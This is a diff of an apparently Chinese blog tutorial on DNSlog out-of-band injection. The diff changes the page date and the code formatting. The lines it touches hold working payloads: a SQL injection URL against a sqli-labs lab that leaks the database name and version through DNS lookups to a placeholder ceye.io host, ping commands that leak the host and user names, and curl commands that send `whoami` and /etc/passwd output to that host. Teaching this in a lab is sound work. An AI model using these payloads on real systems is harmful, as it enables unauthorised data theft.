@@ -469,7 +469,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-10
+                    2023-04-15
                 </div>
                 
 
@@ -609,12 +609,12 @@ load_file<span class="token punctuation">(</span><span class="token punctuation"
 <p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410191656744.png" alt="结果回显4"></p>
 <p>以上就是DNSlog注入的全部流程</p>
 <p>注入期间我发现，可以将多个payload查询拼接在一起，比如如下注入方法：</p>
-<pre><code>http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select database()),'.',(select version()),'.xxx.ceye.io\\abc'))--+
+<pre class=" language-url"><code class="language-url">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(select database()),'.',(select version()),'.xxx.ceye.io\\abc'))--+
 </code></pre>
 <p>效果如下：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220410231848105.png" alt="结果回显5"></p>
 <p>通式:</p>
-<pre><code>http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(payload1),'.',(payload2),(......),'.xxx.ceye.io\\abc'))--+
+<pre class=" language-url"><code class="language-url">http://127.0.0.3/Less-8/?id=1' and load_file(concat('\\\\',(payload1),'.',(payload2),(......),'.xxx.ceye.io\\abc'))--+
 </code></pre>
 <h2 id="0x05-配合其他攻击"><a href="#0x05-配合其他攻击" class="headerlink" title="0x05 配合其他攻击"></a>0x05 配合其他攻击</h2><ul>
 <li><strong>xss</strong></li>
@@ -629,7 +629,7 @@ load_file<span class="token punctuation">(</span><span class="token punctuation"
 <ol>
 <li>在windows平台，利用ping命令，有如下payload</li>
 </ol>
-<pre><code>ping %COMPUTERNAME%.xxx.ceye.io
+<pre class=" language-cmd"><code class="language-cmd">ping %COMPUTERNAME%.xxx.ceye.io
 或者
 ping %USERNAME%.xxx.ceye.io
 </code></pre>
@@ -637,8 +637,8 @@ ping %USERNAME%.xxx.ceye.io
 <ol start="2">
 <li>在linux平台，利用curl命令，有如下payload</li>
 </ol>
-<pre><code>curl http://ip.port.xxx.ceye.io/`whoami`
-curl http://ip.port.xxx.ceye.io/`cat /etc/passwd`
+<pre class=" language-bash"><code class="language-bash">curl http://ip.port.xxx.ceye.io/<span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>
+curl http://ip.port.xxx.ceye.io/<span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/passwd<span class="token variable">`</span></span>
 </code></pre>
 <p>反引号中可以写入各种linux命令</p>
 <ul>
